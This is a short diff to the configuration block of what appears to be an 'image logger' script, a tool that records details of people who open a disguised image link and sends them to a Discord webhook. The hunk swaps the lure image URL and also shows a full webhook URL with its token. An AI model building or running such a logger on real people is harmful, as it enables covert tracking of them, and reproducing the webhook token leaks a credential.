@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1402909751905353738/7FZmI0oYznA4nh2b7FwQ8jdTnwk08ZMD5x8eMC2QH8qEnKOuWT2cMk1fQnyRy4AHwfYr",
-    "image": "https://cdn.discordapp.com/avatars/1148376193339494541/45d3804f1841d70e5e8fda9de3362e1b.webp?size=1024", # You can also have a custom image by using a URL argument
+    "image": "https://mir-s3-cdn-cf.behance.net/project_modules/max_1200/092aae106129225.60a9d5fe58475.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
